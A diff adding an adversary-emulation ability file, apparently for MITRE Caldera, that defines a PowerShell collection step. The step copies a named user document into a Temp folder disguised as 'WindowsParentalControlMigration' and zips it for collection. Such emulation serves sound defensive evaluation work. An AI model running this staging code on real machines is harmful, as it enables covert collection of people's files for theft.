@@ -1,0 +1,65 @@
+ability_id: fc231955-774f-442c-ac0e-e74dfda50c5c
+access: {}
+additional_info: {}
+buckets:
+- collection
+delete_payload: true
+description: Collect a specific document from a target machine.
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: "try{\n  if (!(test-path -path \"C:\\Windows\\Temp\\WindowsParentalControlMigration\"\
+    \ -ErrorAction Stop)) {\n    New-Item -Path \"C:\\Windows\\temp\\\" -Name \"WindowsParentalControlMigration\"\
+    \ -ItemType \"directory\" -force;\n  }\n} catch {\n  write-host \"[!] Access is\
+    \ denied. Manually browse to C:\\Windows\\Temp via Explorer and accept prompt\"\
+    ;\n  exit 1;\n}\n\nif (! (test-path -path \"C:\\Users\\#{profile_user_day2}\\\
+    Documents\\MITRE-ATTACK-EVALS.HTML\")) {\n  write-host \"[!] Error, MITRE-ATTACK-EVALS.HTML\
+    \ was not found.\";\n  exit 1;\n}\nCopy-Item \"C:\\Users\\#{profile_user_day2}\\\
+    Documents\\MITRE-ATTACK-EVALS.HTML\" -Destination \"C:\\Windows\\Temp\\WindowsParentalControlMigration\"\
+    \ -force;\n. .\\stepSeventeen_zip.ps1;\nzip C:\\Windows\\Temp\\WindowsParentalControlMigration.tmp\
+    \ C:\\Windows\\Temp\\WindowsParentalControlMigration;\nif ($?) {\n  write-host\
+    \ \"[+] Documents successfully staged for collection.\";\n}"
+  language: null
+  name: psh
+  parsers: []
+  payloads:
+  - stepSeventeen_zip.ps1
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: "try{\n  if (!(test-path -path \"C:\\Windows\\Temp\\WindowsParentalControlMigration\"\
+    \ -ErrorAction Stop)) {\n    New-Item -Path \"C:\\Windows\\temp\\\" -Name \"WindowsParentalControlMigration\"\
+    \ -ItemType \"directory\" -force;\n  }\n} catch {\n  write-host \"[!] Access is\
+    \ denied. Manually browse to C:\\Windows\\Temp via Explorer and accept prompt\"\
+    ;\n  exit 1;\n}\n\nif (! (test-path -path \"C:\\Users\\#{profile_user_day2}\\\
+    Documents\\MITRE-ATTACK-EVALS.HTML\")) {\n  write-host \"[!] Error, MITRE-ATTACK-EVALS.HTML\
+    \ was not found.\";\n  exit 1;\n}\nCopy-Item \"C:\\Users\\#{profile_user_day2}\\\
+    Documents\\MITRE-ATTACK-EVALS.HTML\" -Destination \"C:\\Windows\\Temp\\WindowsParentalControlMigration\"\
+    \ -force;\n. .\\stepSeventeen_zip.ps1;\nzip C:\\Windows\\Temp\\WindowsParentalControlMigration.tmp\
+    \ C:\\Windows\\Temp\\WindowsParentalControlMigration;\nif ($?) {\n  write-host\
+    \ \"[+] Documents successfully staged for collection.\";\n}"
+  language: null
+  name: pwsh
+  parsers: []
+  payloads:
+  - stepSeventeen_zip.ps1
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: Collect Files & Compress Collection
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: collection
+technique_id: T1005
+technique_name: Data from Local System
